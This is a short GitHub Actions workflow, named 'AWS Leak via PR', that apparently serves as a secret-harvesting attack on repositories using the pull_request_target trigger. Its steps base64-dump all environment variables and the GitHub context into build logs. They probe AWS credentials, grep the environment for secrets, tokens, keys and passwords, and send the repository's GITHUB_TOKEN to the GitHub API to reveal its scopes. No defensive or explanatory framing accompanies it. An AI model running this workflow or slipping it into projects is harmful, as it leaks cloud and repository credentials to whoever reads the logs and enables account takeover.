name: AWS Leak via PR

on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  leak:
    runs-on: ubuntu-latest
    steps:
      - name: Dump ALL env vars
        run: env | base64 -w0
      
      - name: Dump GitHub context
        run: |
          echo '${{ toJSON(github) }}' | base64 -w0
      
      - name: Try AWS with any available creds
        run: |
          aws sts get-caller-identity 2>&1 || true
          env | grep -iE 'aws|secret|token|key|password' | head -50
      
      - name: Dump all secrets  
        run: |
          echo "GITHUB_TOKEN scopes:"
          curl -s -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" https://api.github.com/user
